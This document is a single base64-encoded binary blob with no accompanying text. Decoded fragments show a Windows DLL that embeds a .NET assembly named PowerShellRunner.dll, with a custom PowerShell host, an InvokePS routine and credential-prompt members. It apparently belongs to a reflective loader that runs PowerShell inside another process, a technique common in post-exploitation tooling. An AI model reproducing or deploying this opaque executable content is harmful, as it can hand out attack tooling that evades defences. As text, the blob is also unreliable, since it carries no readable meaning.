AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAFgAAAAIAAAACAAAAAwAAAAIAAAAEAAAAGAAAAAUAAAANAAAABgAAAAkAAAAHAAAADAAAAAgAAAAMAAAACQAAAAwAAAAKAAAABwAAAAsAAAAIAAAADAAAABYAAAANAAAAFgAAAA8AAAACAAAAEAAAAA0AAAARAAAAEgAAABIAAAACAAAAIQAAAA0AAAA1AAAAAgAAAEEAAAANAAAAQwAAAAIAAABQAAAAEQAAAFIAAAANAAAAUwAAAA0AAABXAAAAFgAAAFkAAAALAAAAbAAAAA0AAABtAAAAIAAAAHAAAAAcAAAAcgAAAAkAAAAGAAAAFgAAAIAAAAAKAAAAgQAAAAoAAACCAAAACQAAAIMAAAAWAAAAhAAAAA0AAACRAAAAKQAAAJ4AAAANAAAAoQAAAAIAAACkAAAACwAAAKcAAAANAAAAtwAAABEAAADOAAAAAgAAANcAAAALAAAAGAcAAAwAAAAMAAAACAAAAP////8AAAAAAAAAAAAAAAD//////////4AKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/////wAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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HMiAAAKehIAKwAqEgArACoSACsAKnoCKCMAAAp9AQAABAJzDwAABn0CAAAEAigkAAAKACqCAnM7AAAGfQQAAAQCKCUAAAoAAAJzJgAACn0DAAAEACo+AAJ7AwAABAVvJwAACiYqTgACewMAAARyIwMAcG8nAAAKJipmAAJ7AwAABAVyIwMAcCgoAAAKbycAAAomKj4AAnsDAAAEA28nAAAKJipmAAJ7AwAABHInAwBwAygoAAAKbykAAAomKmYAAnsDAAAEcjcDAHADKCgAAApvKQAACiYqPgACewMAAAQDbykAAAomKmYAAnsDAAAEckcDAHADKCgAAApvKQAACiYqZgACewMAAARyWwMAcAMoKAAACm8pAAAKJioSACsAKhMwAQARAAAAAwAAEQACewMAAARvKgAACgorAAYqMgBybwMAcHMiAAAKejIActIEAHBzIgAACnoyAHJHBgBwcyIAAAp6MgByxgcAcHMiAAAKegAAABMwAQAMAAAABwAAEQACewQAAAQKKwAGKjIAckUJAHBzIgAACnoyAHKsCgBwcyIAAAp6AAATMAEADAAAAAgAABEAAnsJAAAECisABiomAAIDfQkAAAQqAAATMAEADAAAAAkAABEAAnsMAAAECisABiomAAIDfQwAAAQqAAATMAEADAAAAAoAABEAAnsGAAAECisABiomAAIDfQYAAAQqAAATMAEADAAAAAsAABEAAnsHAAAECisABiomAAIDfQcAAAQqMgByLwwAcHMiAAAKegATMAEADAAAAAgAABEAAnsIAAAECisABiomAAIDfQgAAAQqMgByeQwAcHMiAAAKejIAcsUMAHBzIgAACnoTMAEADAAAAAkAABEAAnsKAAAECisABioTMAEADAAAAAkAABEAAnsLAAAECisABioyAHIHDQBwcyIAAAp6MgBybA4AcHMiAAAKejIAcrwOAHBzIgAACnoyAHIIDwBwcyIAAAp6EzABAAwAAAAKAAARAAJ7DQAABAorAAYqJgACA30NAAAEKgAAEzABAAwAAAAJAAARAAJ7BQAABAorAAYqJgACA30FAAAEKgAAEzABAAwAAAADAAARAAJ7DgAABAorAAYqJgACA30OAAAEKgAAEzADAAIBAAAMAAARAhIA/hUUAAABEgAfeCgrAAAKABIAH2QoLAAACgAGfQUAAAQCEgH+F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CcAcgEEgAAAAQAAAAAAAAAAAAAAAAAfAAAAAgAAAAAAAAAAAAAAAQB1AAAAAAABAAAAAAAAAAAAAAAKAIwAAAAAAAMAAgAEAAIABQACAAAAADxNb2R1bGU+AFBvd2VyU2hlbGxSdW5uZXIuZGxsAFBvd2VyU2hlbGxSdW5uZXIAQ3VzdG9tUFNIb3N0AEN1c3RvbVBTSG9zdFVzZXJJbnRlcmZhY2UAQ3VzdG9tUFNSSG9zdFJhd1VzZXJJbnRlcmZhY2UAbXNjb3JsaWIAU3lzdGVtAE9iamVjdABTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uAFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uSG9zdABQU0hvc3QAUFNIb3N0VXNlckludGVyZmFjZQBQU0hvc3RSYXdVc2VySW50ZXJmYWNlAEludm9rZVBTAC5jdG9yAEd1aWQAX2hvc3RJZABfdWkAZ2V0X0luc3RhbmNlSWQAZ2V0X05hbWUAVmVyc2lvbgBnZXRfVmVyc2lvbgBnZXRfVUkAU3lzdGVtLkdsb2JhbGl6YXRpb24AQ3VsdHVyZUluZm8AZ2V0X0N1cnJlbnRDdWx0dXJlAGdldF9DdXJyZW50VUlDdWx0dXJlAEVudGVyTmVzdGVkUHJvbXB0AEV4aXROZXN0ZWRQcm9tcHQATm90aWZ5QmVnaW5BcHBsaWNhdGlvbgBOb3RpZnlFbmRBcHBsaWNhdGlvbgBTZXRTaG91bGRFeGl0AEluc3RhbmNlSWQATmFtZQBVSQBDdXJyZW50Q3VsdHVyZQBDdXJyZW50VUlDdWx0dXJlAFN5c3RlbS5UZXh0AFN0cmluZ0J1aWxkZXIAX3NiAF9yYXdVaQBDb25zb2xlQ29sb3IAV3JpdGUAV3JpdGVMaW5lAFdyaXRlRGVidWdMaW5lAFdyaXRlRXJyb3JMaW5lAFdyaXRlVmVyYm9zZUxpbmUAV3JpdGVXYXJuaW5nTGluZQBQcm9ncmVzc1JlY29yZABXcml0ZVByb2dyZXNzAGdldF9PdXRwdXQAU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMARGljdGlvbmFyeWAyAFBTT2JqZWN0AFN5c3RlbS5Db2xsZWN0aW9ucy5PYmplY3RNb2RlbABDb2xsZWN0aW9uYDEARmllbGREZXNjcmlwdGlvbgBQcm9tcHQAQ2hvaWNlRGVzY3JpcHRpb24AUHJvbXB0Rm9yQ2hvaWNlAFBTQ3JlZGVudGlhbABQU0NyZWRlbnRpYWxUeXBlcwBQU0NyZWRlbnRpYWxVSU9wdGlvbnMAUHJvbXB0Rm9yQ3JlZGVudGlhbABnZXRfUmF3VUkAUmVhZExpbmUAU3lzdGVtLlNlY3VyaXR5AFNlY3VyZVN0cmluZwBSZWFkTGluZUFzU2VjdXJlU3RyaW5nAE91dHB1dABSYXdVSQBTaXplAF93aW5kb3dTaXplAENvb3JkaW5hdGVzAF9jdXJzb3JQb3NpdGlvbgBfY3Vyc29yU2l6ZQBfZm9yZWdyb3VuZENvbG9yAF9iYWNrZ3JvdW5kQ29sb3IAX21heFBoeXNpY2FsV2luZG93U2l6ZQBfbWF4V2luZG93U2l6ZQBfYnVmZmVyU2l6ZQBfd2luZG93UG9zaXRpb24AX3dpbmRvd1RpdGxlAGdldF9CYWNrZ3JvdW5kQ29sb3IAc2V0X0JhY2tncm91bmRDb2xvcgBnZXRfQnVmZmVyU2l6ZQBzZXRfQnVmZmVyU2l6ZQBnZXRfQ3Vyc29yUG9zaXRpb24Ac2V0X0N1cnNvclBvc2l0aW9uAGdldF9DdXJzb3JTaXplAHNldF9DdXJzb3JTaXplAEZsdXNoSW5wdXRCdWZmZXIAZ2V0X0ZvcmVncm91bmRDb2xvcgBzZXRfRm9yZWdyb3VuZENvbG9yAEJ1ZmZlckNlbGwAUmVjdGFuZ2xlAEdldEJ1ZmZlckNvbnRlbnRzAGdldF9LZXlBdmFpbGFibGUAZ2V0X01heFBoeXNpY2FsV2luZG93U2l6ZQBnZXRfTWF4V2luZG93U2l6ZQBLZXlJbmZvAFJlYWRLZXlPcHRpb25zAFJlYWRLZXkAU2Nyb2xsQnVmZmVyQ29udGVudHMAU2V0QnVmZmVyQ29udGVudHMAZ2V0X1dpbmRvd1Bvc2l0aW9uAHNldF9XaW5kb3dQb3NpdGlvbgBnZXRfV2luZG93U2l6ZQBzZXRfV2luZG93U2l6ZQBnZXRfV2luZG93VGl0bGUAc2V0X1dpbmRvd1RpdGxlAEJhY2tncm91bmRDb2xvcgBCdWZmZXJTaXplAEN1cnNvclBvc2l0aW9uAEN1cnNvclNpemUARm9yZWdyb3VuZENvbG9yAEtleUF2YWlsYWJsZQBNYXhQaHlzaWNhbFdpbmRvd1NpemUATWF4V2luZG93U2l6ZQBXaW5kb3dQb3NpdGlvbgBXaW5kb3dTaXplAFdpbmRvd1RpdGxlAGNvbW1hbmQAZXhpdENvZGUAZm9yZWdyb3VuZENvbG9yAGJhY2tncm91bmRDb2xvcgB2YWx1ZQBtZXNzYWdlAHNvdXJjZUlkAHJlY29yZABjYXB0aW9u